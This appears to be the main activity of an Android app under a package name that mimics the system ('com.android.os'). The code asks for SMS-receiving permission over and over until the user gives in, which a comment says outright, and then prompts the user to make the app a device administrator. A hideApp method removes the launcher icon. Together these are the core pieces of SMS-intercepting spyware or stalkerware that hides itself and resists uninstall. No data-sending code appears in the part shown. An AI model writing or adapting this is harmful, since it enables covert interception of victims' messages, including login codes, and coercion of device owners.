package com.android.os;

import android.Manifest;
import android.annotation.SuppressLint;
import android.app.Activity;
import android.app.admin.DeviceAdminReceiver;
import android.app.admin.DevicePolicyManager;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.os.Build;
import android.support.annotation.NonNull;
import android.support.v7.app.AppCompatActivity;
import android.os.Bundle;
import android.util.Log;
import android.view.View;

public class MainActivity extends AppCompatActivity {
    private static final int PERMISSION_REQUEST_CODE_RECEIVING_SMS = 0;
    private static final int REQUEST_CODE_ENABLE_DEVICE_ADMIN = 10;


    DevicePolicyManager mDPM;
    ComponentName mAdminName;


    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
        mDPM = (DevicePolicyManager) getSystemService(Context.DEVICE_POLICY_SERVICE);
        mAdminName = new ComponentName(this, DeviceAdmin.class);

        if (!isHavePermissionForReceivingSMS()) {
            requestPermissionForReceivingSMS();
        } else {
            makeAppAsDeviceAdministrator();
        }


    }
    @Override
    protected void onActivityResult(int requestCode, int resultCode, Intent data) {
        super.onActivityResult(requestCode, resultCode, data);
        if (REQUEST_CODE_ENABLE_DEVICE_ADMIN == requestCode) {
            if (resultCode == Activity.RESULT_OK) {
                // Has become the device administrator.
                SHOW_LOG("app is now device administrator");
            } else {
                //Canceled or failed.
                SHOW_LOG("Canceled to make our app as Device administrator");
            }
        }
    }
    @Override
    public void onRequestPermissionsResult(int requestCode, @NonNull String[] permissions, @NonNull int[] grantResults) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults);

        if (requestCode == PERMISSION_REQUEST_CODE_RECEIVING_SMS) { // prompt user again & again until he grant the permission
            if (grantResults.length > 0 && grantResults[0] == PackageManager.PERMISSION_GRANTED) {
                // double check, may be permission is denied by some error, like screen overflow
                if (!isHavePermissionForReceivingSMS()) {
                    requestPermissionForReceivingSMS();
                } else { // permission granted
                    SHOW_LOG("Permission Granted");
                    makeAppAsDeviceAdministrator();
                }
            } else {
                // user deny the permission
                requestPermissionForReceivingSMS();
            }
        }

    }

    public void hideApp(View view) {
        PackageManager p = getPackageManager();
        ComponentName componentName = new ComponentName(this, MainActivity.class); // activity which is first time open in manifiest file which is declare as <category android:name="android.intent.category.LAUNCHER" />
        p.setComponentEnabledSetting(componentName,PackageManager.COMPONENT_ENABLED_STATE_DISABLED, PackageManager.DONT_KILL_APP);
        finish();
    }








    /******** Helper Methods*/
    private void SHOW_LOG(String message) {
        Log.i("123456", message);
    }

    public boolean isHavePermissionForReceivingSMS() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            return checkSelfPermission(android.Manifest.permission.RECEIVE_SMS) == PackageManager.PERMISSION_GRANTED;
        }
        return true;

    }

    @SuppressLint("NewApi")
    private void requestPermissionForReceivingSMS() {
        requestPermissions(new String[]{Manifest.permission.RECEIVE_SMS}, PERMISSION_REQUEST_CODE_RECEIVING_SMS);
    }

    private void makeAppAsDeviceAdministrator() {
        if (!mDPM.isAdminActive(mAdminName)) {
            //try to become active – must happen here in this activity, to get result
            Intent intent = new Intent(DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN);
            intent.putExtra(DevicePolicyManager.EXTRA_DEVICE_ADMIN, mAdminName);
            intent.putExtra(DevicePolicyManager.EXTRA_ADD_EXPLANATION, "Additional text explaining why this needs to be added.");
            startActivityForResult(intent, REQUEST_CODE_ENABLE_DEVICE_ADMIN);
        } else {
            SHOW_LOG("Already is a device administrator");
        }
    }














    public static class DeviceAdmin extends DeviceAdminReceiver {

        @Override
        public void onEnabled(Context context, Intent intent) {
            SHOW_LOG("admin_receiver_status_enabled");
        }

        @Override
        public CharSequence onDisableRequested(Context context, Intent intent) {
            return "admin_receiver_status_disable_warning";
        }

        @Override
        public void onDisabled(Context context, Intent intent) {
            SHOW_LOG("admin_receiver_status_disabled");
        }

        private void SHOW_LOG(String message) {
            Log.i("123456", message);
        }
    }
}
